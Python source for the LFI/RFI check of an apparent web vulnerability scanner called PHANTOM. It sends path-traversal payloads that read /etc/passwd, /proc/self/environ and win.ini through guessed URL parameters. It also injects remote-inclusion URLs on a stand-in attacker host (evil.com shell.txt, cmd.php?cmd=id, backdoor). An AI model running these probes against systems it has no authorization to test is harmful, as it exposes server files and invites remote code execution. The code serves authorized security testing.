"""
PHANTOM — LFI / RFI Detection Module

Detection:
1. Inject path traversal: ../../../etc/passwd etc.
2. Check response for file contents (root:, [boot loader], bin/bash)
3. Test common LFI parameters: file, page, include, path, doc, template, load
4. RFI probe: inject http://evil.com/test URL
"""
from __future__ import annotations

import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.target import Target, VulnFinding
from core.findings import Finding, FindingsDB
from core.engine import PhantomEngine
from core.config import PhantomConfig
from utils.http_client import request, Response


class LFICheck:
    """Local File Inclusion / Remote File Inclusion detection."""

    def __init__(self, engine: PhantomEngine):
        self.engine = engine
        self.target = engine.target

    def run(self):
        """Run LFI/RFI checks against discovered parameterized URLs."""
        print("[*] Starting LFI/RFI checks...")
        findings = 0

        # LFI-prone parameter names
        lfi_params = ["file", "page", "include", "path", "doc",
                       "template", "load", "dir", "folder", "root",
                       "read", "show", "view", "loc", "inc"]

        urls = self._collect_urls(lfi_params)
        if not urls:
            print("  [!] No suitable URLs found for LFI testing")
            return

        for url, param in urls:
            try:
                if self._test_lfi(url, param):
                    findings += 1
                    continue
                self._test_rfi(url, param)
            except Exception as e:
                print(f"  [!] LFI test failed for {url}: {e}")
                continue

        print(f"  [+] LFI/RFI checks complete — {findings} finding(s)")

    # ── URL collection ──────────────────────────────────────────────

    def _collect_urls(self, target_params: list[str]) -> list[tuple[str, str]]:
        """Find URLs with LFI-prone parameters from all discovered endpoints."""
        results = []
        sources = list(set(
            self.target.directories + self.target.js_endpoints
        ))

        for ep in sources:
            if "?" not in ep:
                # Generate test URLs for LFI params
                clean = ep.split("?")[0]
                for param in target_params:
                    results.append((f"{clean}?{param}=test", param))
                continue

            qs = ep.split("?", 1)[1]
            for part in qs.split("&"):
                if "=" not in part:
                    continue
                pname = part.split("=")[0].lower()
                if pname in target_params:
                    results.append((ep, pname))

            # Also generate standalone tests for common params
            clean = ep.split("?")[0]
            for param in target_params:
                test_url = f"{clean}?{param}=test"
                test_param = param
                if not any(test_url == r[0] for r in results):
                    results.append((test_url, test_param))

        # Deduplicate
        seen = set()
        unique = []
        for url, param in results:
            key = f"{url}:{param}"
            if key not in seen:
                seen.add(key)
                unique.append((url, param))

        return unique

    # ── LFI testing ─────────────────────────────────────────────────

    def _test_lfi(self, url: str, param: str) -> bool:
        """Test for Local File Inclusion via path traversal."""
        payloads = {
            "/etc/passwd":          ["root:", "www-data", "bin/bash", "/bin/sh"],
            "../../../etc/passwd":  ["root:", "www-data", "bin/bash"],
            "....//....//....//etc/passwd": ["root:", "www-data"],
            "/windows/win.ini":     ["[boot loader]", "fonts", "[fonts]"],
            "..\\..\\..\\windows\\win.ini": ["[boot loader]", "[fonts]"],
            "/etc/hosts":           ["localhost", "127.0.0.1"],
            "/proc/self/environ":   ["PATH=", "HOME=", "USER="],
        }

        for payload, indicators in payloads.items():
            test_url = self._inject(url, param, payload)
            try:
                resp = request(test_url, timeout=10)
                if not resp or not resp.body:
                    continue

                body = resp.body
                for indicator in indicators:
                    if indicator in body:
                        evidence = body[:300].strip()
                        self.engine.findings.add(Finding(
                            name="Local File Inclusion (LFI)",
                            severity="CRITICAL",
                            url=url,
                            param=param,
                            payload=payload,
                            evidence=f"Indicator '{indicator}' found in response",
                            phase="vuln",
                        ))
                        print(f"  [+] LFI @ {url} ?{param}={payload}")
                        return True
            except Exception:
                continue

        return False

    # ── RFI testing ─────────────────────────────────────────────────

    def _test_rfi(self, url: str, param: str) -> bool:
        """Test for Remote File Inclusion by injecting external URL."""
        payloads = [
            "http://evil.com/shell.txt",
            "http://evil.com/cmd.php?cmd=id",
            "https://evil.com/backdoor?",
        ]

        for payload in payloads:
            test_url = self._inject(url, param, payload)
            try:
                resp = request(test_url, timeout=10)
                if not resp:
                    continue

                body = resp.body
                # If the response includes our injected domain, RFI may be working
                if "evil.com" in body or "shell.txt" in body:
                    self.engine.findings.add(Finding(
                        name="Remote File Inclusion (RFI)",
                        severity="CRITICAL",
                        url=url,
                        param=param,
                        payload=payload,
                        evidence=f"Payload URL reflected in response",
                        phase="vuln",
                    ))
                    print(f"  [+] RFI @ {url} ?{param}={payload}")
                    return True

                # Also check for connection errors that indicate server
                # tried to reach our URL (timeout/connection refused)
                if "connection" in body.lower() and "refused" in body.lower():
                    self.engine.findings.add(Finding(
                        name="Remote File Inclusion (RFI) - Possible",
                        severity="HIGH",
                        url=url,
                        param=param,
                        payload=payload,
                        evidence="Server attempted connection to external URL",
                        phase="vuln",
                    ))
                    print(f"  [+] RFI (possible) @ {url}")
                    return True
            except Exception:
                continue

        return False

    # ── Helpers ─────────────────────────────────────────────────────

    def _inject(self, url: str, param: str, payload: str) -> str:
        """Replace parameter value with payload."""
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        new_qs = urlencode(qs, doseq=True)
        return urlunparse(parsed._replace(query=new_qs))
